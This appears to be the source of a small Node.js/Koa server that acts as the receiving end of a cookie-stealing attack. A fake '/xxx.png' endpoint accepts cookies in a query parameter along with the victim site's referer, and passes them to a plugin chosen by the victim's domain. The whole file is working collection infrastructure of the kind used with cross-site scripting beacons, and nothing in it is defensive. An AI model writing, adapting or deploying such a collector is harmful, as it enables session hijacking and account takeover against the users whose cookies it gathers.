var koa = require('koa');
var router = require('koa-router');
var app = koa();
var debug = require('debug')('cookie');
var logger = require('koa-logger');
var dispatch = require('./lib/dispatch');
var URL = require('url');
var tld = require('tldjs');

app.use(logger());
app.use(router(app));

app.get('/xxx.png', function *() {
  var result = {};

  var query = this.request.query;
  result.cookies = query.c;
  result.referer = query.referer || this.request.header.referer;

  this.body = 'done';

  var host = URL.parse(result.referer).host;
  var domain = tld.getDomain(host);

  var pluginName = result.plugin = query.plugin || domain;

  debug(result);

  if (pluginName) {
    debug('pluginName = ', pluginName)
    process.nextTick(function () {
      dispatch(pluginName, result);
    });
  } else {
    debug('pluginName is blank');
  }
});

app.listen(3000);